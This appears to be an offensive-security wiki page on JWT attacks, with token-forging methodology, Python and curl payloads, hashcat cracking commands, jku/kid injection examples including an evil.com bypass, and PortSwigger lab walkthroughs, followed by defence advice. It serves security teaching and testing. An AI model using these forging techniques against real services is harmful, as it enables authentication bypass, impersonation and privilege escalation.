---
title: "JWT Attacks"
type: technique
tags: [authentication, exploitation, h1, jwt, thm, web]
phase: exploitation
date_created: 2026-05-08
date_updated: 2026-07-02
sources: [thm-adv-jwt-security, h1-scraped-jwt-attacks, payloadsallthethings-jwt, git-portswigger-all-labs]
---

## What it is

JWT (JSON Web Token) attacks exploit weaknesses in how tokens are generated, signed, or validated to forge tokens with arbitrary claims — typically to escalate privileges (e.g., setting `admin: 1`) or impersonate other users without knowing their credentials.

## How it works

A JWT has three Base64Url-encoded parts separated by dots: `header.payload.signature`. The header declares the algorithm; the payload contains claims; the signature proves integrity. If the server fails to verify the signature correctly — or accepts a weaker or missing signature — an attacker who can modify the payload gains unauthorised privileges. Because the full JWT is sent to the client, sensitive claims are readable without any key material.

Most JWTs encountered in the wild are actually **JWS (JSON Web Signature)** — signed but not encrypted. JWE (JSON Web Encryption) ensures confidentiality but is rare. JWS ensures the message has not been tampered with; JWE ensures message confidentiality.

## Prerequisites

- A JWT-protected API endpoint
- A valid JWT obtained via normal login
- For algorithm confusion: knowledge or retrieval of the server's public key (RS256)
- For weak secret attack: the secret is short or in a known wordlist

## Methodology

### 1. Identify and Decode the Token

Capture the token from the `Authorization: Bearer <token>` header or a cookie. Decode each section manually or at jwt.io / token.dev:

```sh
# Base64Url decode header
echo "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9" | base64 -d
# {"typ":"JWT","alg":"HS256"}

# Decode payload
echo "eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MH0" | base64 -d
# {"username":"user","admin":0}
```

Look for sensitive information in the claims: password hashes, internal hostnames, flags. Also check `alg` header field to determine which attacks apply.

### 2. Signature Not Verified

Some endpoints accept a JWT with no signature (or a blank signature). Test by removing the third segment (leaving only the trailing dot) and modifying claims:

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiYWRtaW4iOjF9.
```

If the API still responds with 200/valid, signature verification is absent on that endpoint.

### 3. None Algorithm Downgrade

Change the `alg` field in the header to `None` (case variants: `none`, `NONE`, `nOnE`). Re-encode the header and payload with Base64Url, and provide an empty signature (trailing dot). The trailing dot is required even for unsigned tokens.

Original header decoded:
```json
{"typ": "JWT", "alg": "HS256"}
```

Modified header:
```json
{"typ": "JWT", "alg": "None"}
```

Re-encode and submit:
```
<base64url(modified_header)>.<base64url(modified_payload)>.
```

Use CyberChef with "URL-Encoded Base64" to encode without padding. Bypass filter variants: `NoNe`, `NONE`, Unicode/hex/URL encodings, extra base64 padding.

### 4. Weak Secret Brute Force

If HS256 is used with a short or common secret, crack it offline with hashcat:

```sh
hashcat -a 0 -m 16500 <JWT> jwt.secrets.list
# or with rockyou
hashcat -a 0 -m 16500 token.jwt /usr/share/wordlists/rockyou.txt
```

| Option | Description |
|--------|-------------|
| `-a 0` | Dictionary attack (straight mode) |
| `-m 16500` | Hash mode for JWT (HMAC-SHA256) |

Wordlist source: `https://raw.githubusercontent.com/wallarm/jwt-secrets/master/jwt.secrets.list`

Once the secret is known, re-sign any payload with the same algorithm and secret using Burp JWT Editor, jwt.io, or PyJWT.

### 5. Empty HMAC Secret (Unconfigured Signing Key)

Some services ship with JWT authentication enabled but with the HMAC signing secret left as an empty string: either as the default out-of-box configuration or because the operator never set the required configuration field. The server computes `HMAC-SHA256(header.payload, b"")`, a valid, deterministic signature that any attacker can reproduce without prior knowledge or brute force. Hashcat and wordlist attacks will not find an empty secret because wordlists do not contain the empty string.

**Detection:** forge a token signed with an empty key and send it to the target. If the server returns 200 or grants access, the signing secret is empty.

```python
import hmac, hashlib, base64, json

def b64u(d):
    if isinstance(d, str): d = d.encode()
    return base64.urlsafe_b64encode(d).rstrip(b'=').decode()

header  = b64u(json.dumps({'alg': 'HS256', 'typ': 'JWT'}, separators=(',', ':')))
payload = b64u(json.dumps({'username': 'admin', 'role': 'admin', 'exp': 9999999999}, separators=(',', ':')))
msg     = f'{header}.{payload}'
sig     = hmac.new(b'', msg.encode(), hashlib.sha256).digest()
token   = f'{msg}.{b64u(sig)}'
print(token)
```

```bash
# Test the forged token against the target
curl -sk -H "Authorization: Bearer $TOKEN" "https://target.com/api/protected"
```

**Where to look for this misconfiguration:**

- InfluxDB 1.x: `[http]` section, `shared-secret` field in `influxdb.conf`; when unset, defaults to empty string (CVE-2019-20933)
- Node.js / Python services where the secret is read from an environment variable that was never set (evaluates to `""` or `None` cast to string)
- Spring Boot applications where `jwt.secret` property is absent from `application.properties`

**Remediation:** set a randomly generated secret of at least 256 bits; use a secrets manager rather than a config file field that can be accidentally left empty.

### 7. Algorithm Confusion: RS256 to HS256

When a server uses RS256 (asymmetric), the public key is sometimes discoverable (embedded in a claim, returned at a JWKS endpoint, or server response). The attack exploits libraries that allow mixing symmetric and asymmetric algorithms — when HS256 is selected but the library treats the public key as the HMAC secret.

**Step 1: Obtain the public key** — often exposed at `/.well-known/jwks.json` or `/jwks.json`.

```json
{
  "kty": "RSA",
  "e": "AQAB",
  "n": "o-yy1wpYmf...",
  "kid": "75d0ef47..."
}
```

**Step 2: Convert public key to PEM**, then Base64-encode it. In Burp JWT Editor: import the JWK, right-click → "Copy Public Key as PEM", then Base64-encode the PEM.

**Step 3: Create a symmetric key** in Burp JWT Editor → New Symmetric Key → replace the `k` value with the Base64-encoded PEM public key.

**Step 4: Craft the forged JWT** — change `alg` to `HS256`, modify payload (e.g. `sub: administrator`), sign with the symmetric key. Select "Don't modify header" to preserve `alg: HS256`.

```python
import jwt

public_key = "ssh-rsa AAAAB3Nza..."  # obtained from server

payload = {
    'username': 'user',
    'admin': 1          # escalated claim
}

access_token = jwt.encode(payload, public_key, algorithm="HS256")
print(access_token)
```

**Note**: Some JWT libraries (e.g., PyJWT) have mitigations. May require editing `jwt/algorithms.py` to comment out the SSH key type check for testing.

### 8. Algorithm Confusion with No Exposed Key

When the server's public key is not exposed, derive it from two valid JWTs using the `sig2n` tool:

```bash
docker run --rm -it portswigger/sig2n <token1> <token2>
```

The tool outputs one or more candidate values for `n` (the RSA modulus), each with a Base64-encoded X.509 and PKCS1 public key and a tampered JWT. Test each tampered JWT against `/my-account` — a 200 response confirms the correct key. Then use that X.509 key as the `k` value of a new symmetric key in Burp JWT Editor and proceed as per the algorithm confusion attack above.

Alternatively use `jwt_forgery.py` from the `SecuraBV/rsa_sign2n` GitHub repository.

### 9. Signature Disclosure (CVE-2019-7644)

Send a JWT with an incorrect signature. The endpoint might respond with an error disclosing the correct one, allowing you to sign future tokens.
`Invalid signature. Expected 8Qh5lJ5gSaQylkSdaCIDBoOqKzhoJ0Nutkkap8RgB1Y= got ...`

### 10. Embedded JWK Injection (CVE-2018-0114)

The `jwk` header parameter embeds a public key directly in the JWT header. If the server trusts the embedded key for verification, an attacker can:

1. Generate their own RSA key pair (e.g., via Burp JWT Editor → New RSA Key).
2. Modify the payload (e.g., `sub: administrator`).
3. Use Burp JWT Editor → Attack → "Embedded JWK" to inject the public key into the `jwk` header and sign with the paired private key.
4. The server, if misconfigured, will use the embedded public key and accept the forged token.

Example header with embedded JWK:
```json
{
  "alg": "RS256",
  "jwk": {
    "kty": "RSA",
    "n": "base64url-modulus",
    "e": "AQAB"
  }
}
```

Using `jwt_tool.py`: `jwt_tool.py <JWT> -X i`

### 11. `jku` Header Injection

The `jku` header points to the URL of the JWKS file. If the server fetches and trusts whatever URL is in this field without domain validation:

1. Generate an RSA key pair in Burp JWT Editor.
2. Copy the public key in JWK format.
3. Host a malicious JWKS file at an attacker-controlled URL (e.g., on an exploit server at `/.well-known/jwks.json`):

```json
{
  "keys": [
    {
      "kty": "RSA",
      "kid": "attacker-key",
      "n": "<modulus>",
      "e": "AQAB"
    }
  ]
}
```

4. Craft a JWT with the `jku` header pointing to your JWKS URL and sign with your private key:

```json
{
  "alg": "RS256",
  "jku": "https://exploit-server.com/.well-known/jwks.json",
  "kid": "attacker-key"
}
```

5. Modify payload (`sub: administrator`) and send.

If the server restricts domains, try bypasses: URL obfuscation (`https://trusted.com@evil.com`), open redirects on trusted hosts, SSRF via host headers.

Using `jwt_tool.py`: `jwt_tool.py <JWT> -X s -ju http://example.com/jwks.json`

### 12. `x5u` Header Injection

Similar to `jku`, the `x5u` header points to a URL for an X.509 certificate chain. Replace with an attacker-controlled URL containing a self-signed certificate. Parsing flaws in certificate chains (CVE-2017-2800, CVE-2018-2633) have enabled critical exploits via the `x5c` parameter.

### 13. JWT `kid` Claim Misuse (Path Traversal / SQL Injection)

The `kid` (key ID) claim indicates the key used to sign the JWT. If the server uses this parameter to fetch the key from the filesystem without validation:

**Directory traversal:**
- Set `kid` to `../../../../../../../dev/null` and sign the token with a null byte secret (Base64: `AA==`).
- `/dev/null` contains nothing, so the signing key becomes an empty/null byte string.
- In Burp JWT Editor: generate a new symmetric key, replace `k` with `AA==`, change `kid` to the traversal path, sign with "Don't modify header".

```json
{ "kid": "../../../../../../../dev/null" }
```

**Other filesystem targets:**
- `kid: /proc/sys/kernel/randomize_va_space` → sign with "2" (if ASLR is 2).

**SQL injection in `kid`** (when keys stored in DB):
```json
{ "kid": "' OR '1'='1" }
```

### 14. Cross-Service Relay Attack

In SSO environments, the same authentication server issues tokens for multiple applications. If an application does not verify the `aud` (audience) claim, a JWT minted for Application B (where you have admin rights) can be replayed against Application A:

```sh
# Authenticate to appB — receive JWT with "admin": 1
curl -X POST -d '{"username":"user","password":"pass","application":"appB"}' http://auth-server/token

# Use that token against appA
curl -H 'Authorization: Bearer <appB_token>' http://appA/api?username=admin
```

### 15. Persistent Tokens (No `exp` Claim)

If a token has no `exp` claim, most libraries accept it indefinitely. Test by reusing old tokens. A permanently valid token found through log exposure or past interception remains usable.

## Key Payloads / Examples

Claim modification workflow:

```sh
# 1. Authenticate
curl -H 'Content-Type: application/json' -X POST \
  -d '{"username":"user","password":"password2"}' \
  http://TARGET/api/v1.0/example2

# 2. Decode and modify payload: change "admin":0 to "admin":1
# 3. Re-encode header.payload (Base64Url, no padding)
# 4. Submit with empty signature
curl -H 'Authorization: Bearer <forged_token>.' \
  http://TARGET/api/v1.0/example2?username=admin
```

None algorithm — modified header Base64Url:

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJOb25lIn0
```
Decoded: `{"typ":"JWT","alg":"None"}`

Algorithm confusion attack (Lab 8 — no exposed key):
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```
```json
{
  "sub": "administrator",
  "iat": <keep_original_value>
}
```

## Bypasses and Variants

| Attack | Condition |
|---|---|
| No signature check | Endpoint omits `verify_signature` |
| None algorithm | Server reads `alg` from header and passes it to decode |
| HS256 with public key | Server allows mixed alg list without discriminating key type |
| Weak secret | Short/dictionary secret used for HS256 |
| Embedded JWK (`jwk`) | Server trusts public key embedded in token header |
| `jku` injection | Server fetches JWKS from attacker-controlled URL |
| `kid` path traversal | Server reads key from filesystem path given in `kid` |
| `kid` SQL injection | Server queries DB for key using unsanitised `kid` |
| Algorithm confusion (no key) | Public key derived from two token signatures via sig2n |
| Cross-service relay | `aud` claim not verified per-application |
| Sensitive disclosure | Credentials/flags stored as claims rather than server-side |

## Real-World Examples (HackerOne — paid reports)

No paid JWT-specific reports in current H1 dataset (0 of 1,901 bounty reports tagged jwt-attacks). JWT weaknesses are typically filed under authentication-attacks or access-control — see those pages for related H1 examples.

## Detection and Defence

- Always verify the JWT signature server-side; never set `verify_signature: False`
- Whitelist accepted algorithms explicitly — never read `alg` from the token header alone; reject `alg: none` outright
- Do not mix symmetric and asymmetric algorithms in the same allowed list without key-type discrimination
- Use a long, random secret for HS256; rotate it regularly
- Validate `jku` and `x5u` header values against a strict allowlist of trusted domains; do not fetch arbitrary URLs
- Do not trust the `jwk` header for key material; use only server-side configured keys
- Sanitise the `kid` parameter; never use it directly in filesystem paths or SQL queries
- Always include an `exp` claim and honour it; use a blocklist for early revocation
- Verify the `aud` claim on each application to prevent cross-service relay
- Do not store sensitive data (passwords, flags, internal hostnames) as JWT claims

## Tools

- [[burp-suite]] — intercept and modify JWTs (JWT Editor / JOSEPH extension); supports embedded JWK attack, jku injection, algorithm confusion re-signing
- jwt.io / token.dev — online decode/encode/verify (token.dev usable when Burp JWT Editor unavailable)
- CyberChef — Base64Url encode/decode
- `hashcat` — HS256 secret brute force (`-m 16500`)
- `jwt_tool.py` — A toolkit for testing, tweaking and cracking JSON Web Tokens
- `c-jwt-cracker` — JWT brute force cracker written in C
- Python `pyjwt` library — custom token forging scripts
- `portswigger/sig2n` (Docker) — derive RSA public key from two signed JWTs for algorithm confusion with no exposed key
- `SecuraBV/rsa_sign2n` / `jwt_forgery.py` — alternative RSA key derivation tool

## PortSwigger Labs

### Apprentice

#### Lab 1 — JWT authentication bypass via unverified signature

The server does not verify the JWT signature at all. Steps:
1. Log in as `wiener:peter`, capture the session JWT (visible in Burp as a blue-highlighted request with the JWT Editor extension).
2. Send the `GET /my-account` request to Repeater.
3. In the JWT tab, change `sub` from `wiener` to `administrator`.
4. Send — the server accepts the forged token and returns the admin panel.
5. Send `GET /admin/delete?username=carlos` to solve the lab.

#### Lab 2 — JWT authentication bypass via flawed signature verification (`alg: none`)

The server reads `alg` from the token header and accepts `none` as a valid algorithm. Steps:
1. Log in, capture JWT, send to Repeater.
2. In the JWT tab, change `sub` to `administrator`.
3. Change `alg` to `none` (use Burp JWT Editor or manually re-encode).
4. Remove the signature segment, keeping the trailing dot: `header.payload.`
5. Send — the server accepts the unsigned token. Access `/admin`, delete carlos.

### Practitioner

#### Lab 3 — JWT authentication bypass via weak signing key

The server uses HS256 with a guessable secret. Steps:
1. Capture JWT, save to `token.jwt`.
2. Crack the secret offline:

```bash
hashcat -a 0 -m 16500 token.jwt /usr/share/wordlists/rockyou.txt
# or with jwt-secrets wordlist
hashcat -a 0 -m 16500 token.jwt jwt.secrets.list
```

3. Once cracked (e.g., `secret1`), in Burp JWT Editor change `sub` to `administrator`.
4. Sign the token with the discovered secret (remove any extra headers Burp may add).
5. Access `/admin`, delete carlos.

#### Lab 4 — JWT authentication bypass via `jwk` header injection

The server trusts the public key embedded in the `jwk` header. Steps:
1. Log in, capture JWT (RS256), send to Repeater.
2. In Burp JWT Editor Keys tab → New RSA Key → Generate.
3. In the JWT tab, change `sub` to `administrator`.
4. Click Attack → Embedded JWK → select the generated RSA key → OK.
5. The `jwk` header is injected with your public key; token is signed with your private key.
6. Send — the server verifies against the embedded key and accepts the token. Delete carlos.

#### Lab 5 — JWT authentication bypass via `jku` header injection

The server fetches the JWKS from the `jku` header URL without domain validation. Steps:
1. Log in, capture JWT (RS256), send to Repeater.
2. Generate an RSA key pair in Burp JWT Editor.
3. Copy the public key components; format as a JWKS and host it on the exploit server at `/.well-known/jwks.json`:

```json
{
  "keys": [
    {
      "kty": "RSA",
      "kid": "<kid from your key>",
      "n": "<modulus>",
      "e": "AQAB"
    }
  ]
}
```

4. In the JWT header, add `"jku": "https://<exploit-server>/.well-known/jwks.json"` and set `sub` to `administrator`.
5. Sign with your private key (Burp JWT Editor → Sign → select RSA key → "Don't modify header").
6. Send — the server fetches your JWKS, verifies with your public key. Access `/admin`, delete carlos.

#### Lab 6 — JWT authentication bypass via `kid` header path traversal

The server uses the `kid` value as a filesystem path to load the signing key (HS256). Steps:
1. Log in, capture JWT (HS256), send to Repeater.
2. In Burp JWT Editor Keys tab → New Symmetric Key → Generate.
3. Replace the `k` value with `AA==` (Base64-encoded null byte). This represents an empty/null secret matching `/dev/null`.
4. In the JWT header, set `kid` to `../../../../../../../dev/null`.
5. Change `sub` to `administrator`.
6. Sign with the null-byte symmetric key → "Don't modify header" → OK.
7. Send — the server reads `/dev/null` as the key (empty), matches the null-byte signature. Access `/admin`, delete carlos.

### Expert

#### Lab 7 — JWT authentication bypass via algorithm confusion

The server uses RS256 but a vulnerable library accepts HS256 signed with the public key as the HMAC secret. Steps:
1. Navigate to `/.well-known/jwks.json` or `/jwks.json` to retrieve the server's public key.
2. In Burp JWT Editor → New RSA Key → paste the server's JWK and save.
3. Right-click the key → Copy Public Key as PEM.
4. Base64-encode the PEM (Burp Decoder or CyberChef).
5. Create a new Symmetric Key in JWT Editor → replace `k` with the Base64-encoded PEM.
6. In the JWT, change `alg` to `HS256`, `sub` to `administrator`.
7. Sign with the symmetric key → "Don't modify header" → OK.
8. Access `/admin`, delete carlos.

#### Lab 8 — JWT authentication bypass via algorithm confusion with no exposed key

Same as Lab 7 but no JWKS endpoint — the public key must be derived from captured tokens. Steps:
1. Log in, copy the session JWT. Log out, log in again, copy the second JWT.
2. Derive the public key:

```bash
docker run --rm -it portswigger/sig2n <token1> <token2>
```

3. The tool outputs candidate X.509 and PKCS1 public keys. Copy the first X.509 Base64 value and use it in a tampered JWT to test against `/my-account` — a 200 response confirms the correct key.
4. In Burp JWT Editor → New Symmetric Key → replace `k` with the correct Base64 X.509 key.
5. In the JWT, change `alg` to `HS256`, `sub` to `administrator`.
6. Sign with the symmetric key → "Don't modify header" → OK.
7. Access `/admin`, delete carlos.

## Sources

- TryHackMe: JWT Security room
- PortSwigger Web Security Academy: JWT Labs (Apprentice, Practitioner, Expert)
